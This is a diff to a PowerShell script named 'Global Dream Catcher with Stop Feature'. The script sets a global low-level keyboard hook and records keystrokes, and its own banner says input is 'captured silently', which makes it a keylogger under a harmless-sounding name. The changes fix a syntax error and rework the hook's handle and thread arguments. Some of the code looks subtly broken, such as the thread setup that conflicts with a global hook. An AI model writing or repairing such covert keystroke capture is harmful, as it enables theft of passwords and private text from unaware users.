@@ -1,5 +1,3 @@
-# Global Dream Catcher with Stop Feature
-
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -37,11 +35,17 @@ $DreamContent = ""
 
 $StopFlag = $false
 
+# Set hInstance to IntPtr.Zero to indicate a global hook
+$hInstance = [System.IntPtr]::Zero
+
+# Obtain the current thread ID using kernel32.dll
+$threadId = [System.Diagnostics.Process]::GetCurrentProcess().Threads[0].Id
+
 $keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_KEYBOARD_LL, {
     param($nCode, $wParam, $lParam)
 
     if ($nCode -ge 0 -and $wParam -eq [GlobalKeyboardHook]::WM_KEYDOWN) {
-        $kbStruct = [GlobalKeyboardHook]::KBDLLHOOKSTRUCT]::new()
+        $kbStruct = [GlobalKeyboardHook]::KBDLLHOOKSTRUCT::new()
         [System.Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [ref]$kbStruct)
 
         $KeyChar = [char]$kbStruct.vkCode
@@ -57,7 +61,7 @@ $keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_
     }
 
     return [GlobalKeyboardHook]::CallNextHookEx(0, $nCode, $wParam, $lParam)
-}, [System.AppDomain]::CurrentDomain.GetCurrentThreadId(), 0)
+}, $hInstance, $threadId)
 
 Write-Host "Welcome to the Global Dream Catcher with Stop Feature!"
 Write-Host "Type your thoughts using any keyboard input, and it will be captured silently."
